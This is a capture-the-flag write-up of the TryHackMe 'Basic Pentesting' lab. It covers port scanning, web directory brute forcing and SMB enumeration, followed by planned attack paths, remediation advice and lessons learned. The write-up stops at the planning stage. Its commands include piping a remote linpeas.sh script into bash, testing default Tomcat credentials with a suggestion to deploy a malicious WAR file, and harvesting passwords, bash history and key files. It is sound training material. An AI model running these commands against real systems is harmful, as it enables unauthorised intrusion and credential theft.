# TryHackMe - Basic Pentesting Writeup

## Target Information

| Parameter | Value |
|-----------|-------|
| **Target IP** | 10.201.51.20 |
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Ubuntu Linux |
| **Hostname** | BASIC2 |

## Executive Summary

This writeup documents the penetration testing process for the TryHackMe "Basic Pentesting" machine. The assessment revealed multiple vulnerabilities including open SMB shares, weak web application security, and potential credential exposure. The target system runs Ubuntu Linux with various services exposed including SSH, HTTP, SMB, and Apache Tomcat.

## Methodology

1. **Reconnaissance** - Network scanning and service enumeration
2. **Enumeration** - Detailed service analysis and vulnerability identification
3. **Exploitation** - Gaining initial access
4. **Privilege Escalation** - Escalating to root privileges
5. **Post-Exploitation** - Maintaining access and gathering evidence

## Phase 1: Reconnaissance

### Initial Network Scan

```bash
nmap -sCV 10.201.51.20
```

### Scan Results Analysis

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| **22/tcp** | SSH | OpenSSH 8.2p1 Ubuntu | Standard SSH service |
| **80/tcp** | HTTP | Apache httpd 2.4.41 | Web server |
| **139/tcp** | NetBIOS-SSN | Samba smbd 4 | SMB service |
| **445/tcp** | NetBIOS-SSN | Samba smbd 4 | SMB service |
| **8009/tcp** | AJP13 | Apache Jserv Protocol v1.3 | Tomcat connector |
| **8080/tcp** | HTTP | Apache Tomcat 9.0.7 | Application server |

### Key Findings from Initial Scan

1. **Multiple HTTP services** on ports 80 and 8080
2. **SMB services** on ports 139 and 445
3. **SSH service** available but likely requires credentials
4. **Apache Tomcat 9.0.7** - potentially vulnerable version
5. **AJP13 connector** - possible attack vector

## Phase 2: Service Enumeration

### Web Application Enumeration (Port 80)

#### Directory Brute Force
```bash
dirb http://10.201.51.20/ /usr/share/wordlists/dirb/common.txt
```

#### Web Enumeration Results

| Path | Status Code | Size | Notes |
|------|-------------|------|-------|
| `/` | 200 | 158 bytes | Basic index page |
| `/development/` | 200 | Directory listing | **Critical Finding** |
| `/server-status` | 403 | 277 bytes | Apache status (forbidden) |

#### Critical Discovery: /development/ Directory

- **Directory listing enabled** - serious security misconfiguration
- Potential for **sensitive file exposure**
- Requires immediate investigation

### SMB Enumeration

#### Comprehensive SMB Analysis
```bash
enum4linux -a 10.201.51.20 | tee enum4linux.log
```

#### SMB Enumeration Results

| Component | Value | Security Impact |
|-----------|-------|----------------|
| **Workgroup** | WORKGROUP | Standard workgroup |
| **Hostname** | BASIC2 | System identification |
| **OS** | Samba Server 4.15.13-Ubuntu | Version information |
| **Null Sessions** | Allowed | **High Risk** |

#### Discovered Users

| Username | Type | SID |
|----------|------|-----|
| **kay** | Unix User | S-1-22-1-1000 |
| **jan** | Unix User | S-1-22-1-1001 |
| **ubuntu** | Unix User | S-1-22-1-1002 |

#### SMB Shares

| Share Name | Type | Access | Notes |
|------------|------|--------|-------|
| **Anonymous** | Disk | Read/List | **Accessible without credentials** |
| **IPC$** | IPC | N/A | Inter-process communication |

#### Password Policy Findings

| Policy | Value | Security Impact |
|--------|-------|----------------|
| **Minimum Length** | 5 characters | Weak policy |
| **Complexity** | Disabled | **High Risk** |
| **Lockout Threshold** | None | Brute force possible |
| **Maximum Age** | 37 days | Reasonable |

## Phase 3: Vulnerability Analysis

### Critical Vulnerabilities Identified

#### 1. Anonymous SMB Access
- **Risk Level**: High
- **Description**: Anonymous share allows unauthenticated access
- **Impact**: Information disclosure, potential file access
- **Recommendation**: Disable anonymous access

#### 2. Directory Listing Enabled
- **Risk Level**: High  
- **Description**: `/development/` directory exposed with listing
- **Impact**: Sensitive file exposure, application structure disclosure
- **Recommendation**: Disable directory listing

#### 3. Weak Password Policy
- **Risk Level**: Medium
- **Description**: 5-character minimum, no complexity requirements
- **Impact**: Susceptible to brute force attacks
- **Recommendation**: Implement strong password policy

#### 4. Apache Tomcat Exposure
- **Risk Level**: Medium
- **Description**: Tomcat 9.0.7 exposed on port 8080
- **Impact**: Potential remote code execution if default credentials exist
- **Recommendation**: Update Tomcat, change default credentials

## Phase 4: Exploitation Strategy

### Target Priority

1. **Primary Target**: Anonymous SMB share investigation
2. **Secondary Target**: `/development/` directory analysis
3. **Tertiary Target**: Tomcat manager interface
4. **Backup Plan**: SSH brute force against discovered users

### SMB Share Analysis

```bash
# Connect to anonymous share
smbclient //10.201.51.20/Anonymous -N

# List contents
ls

# Download interesting files
get [filename]
```

### Web Directory Analysis

```bash
# Browse development directory
curl http://10.201.51.20/development/

# Look for configuration files
wget -r http://10.201.51.20/development/

# Check for source code or credentials
grep -r "password\|credential\|key" downloaded_files/
```

### Credential Discovery Approach

1. **SMB Share Contents** - Look for configuration files, backups
2. **Development Directory** - Source code, config files
3. **Tomcat Default Credentials** - admin/admin, tomcat/tomcat
4. **SSH Key Discovery** - Check for exposed private keys

## Phase 5: Expected Attack Vectors

### Potential Exploitation Paths

#### Path 1: Credential Discovery
```bash
# Search SMB share for credentials
smbclient //10.201.51.20/Anonymous -N
# Download and analyze files
# Look for SSH keys, passwords, configuration files
```

#### Path 2: Web Application Exploitation
```bash
# Analyze development directory
curl http://10.201.51.20/development/
# Look for source code with hardcoded credentials
# Check for backup files or configuration files
```

#### Path 3: Tomcat Manager Access
```bash
# Test default credentials
curl -u admin:admin http://10.201.51.20:8080/manager/
# If successful, deploy malicious WAR file
```

#### Path 4: SSH Access
```bash
# Use discovered credentials for SSH
ssh kay@10.201.51.20
ssh jan@10.201.51.20
# Or use discovered SSH private key
```

## Phase 6: Post-Exploitation Planning

### Privilege Escalation Strategy

Once initial access is obtained:

1. **System Enumeration**
   ```bash
   # Run LinPEAS
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
   
   # Manual enumeration
   sudo -l
   find / -perm -4000 -type f 2>/dev/null
   cat /etc/crontab
   ```

2. **Credential Harvesting**
   ```bash
   # Check for additional credentials
   grep -r "password" /home/*/
   cat /home/*/.bash_history
   find /home/ -name "*.key" -o -name "*.pem" 2>/dev/null
   ```

3. **Lateral Movement**
   ```bash
   # Use discovered credentials for other users
   su - jan
   su - kay
   ```

## Security Recommendations

### Immediate Actions Required

1. **Disable Anonymous SMB Access**
   ```bash
   # Edit /etc/samba/smb.conf
   map to guest = Never
   ```

2. **Disable Directory Listing**
   ```bash
   # Edit Apache configuration
   Options -Indexes
   ```

3. **Implement Strong Password Policy**
   ```bash
   # Configure password complexity requirements
   # Set minimum length to 12+ characters
   # Enable account lockout
   ```

4. **Secure Tomcat Installation**
   ```bash
   # Change default credentials
   # Restrict manager interface access
   # Update to latest version
   ```

### Long-term Security Improvements

1. **Network Segmentation** - Isolate services on separate VLANs
2. **Access Controls** - Implement proper authentication and authorization
3. **Monitoring** - Deploy intrusion detection systems
4. **Regular Updates** - Maintain current security patches
5. **Security Audits** - Conduct regular penetration testing

## Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| **Nmap** | Port scanning | `nmap -sCV target` |
| **Dirb** | Directory brute force | `dirb http://target/ wordlist` |
| **enum4linux** | SMB enumeration | `enum4linux -a target` |
| **smbclient** | SMB client | `smbclient //target/share` |
| **curl** | HTTP requests | `curl http://target/path` |

## Lessons Learned

1. **Anonymous Access** - Always check for anonymous/guest access to services
2. **Default Configurations** - Many vulnerabilities stem from default settings
3. **Information Disclosure** - Directory listings can reveal sensitive information
4. **Credential Discovery** - Look for credentials in multiple locations
5. **Weak Policies** - Poor password policies enable brute force attacks

## Next Steps

1. Complete the SMB share analysis
2. Investigate the development directory contents
3. Attempt credential discovery and authentication
4. Perform privilege escalation
5. Document all findings and evidence
6. Prepare comprehensive remediation plan

---

**Note**: This writeup represents the reconnaissance and planning phase. The actual exploitation would follow based on the findings from the SMB share and development directory analysis.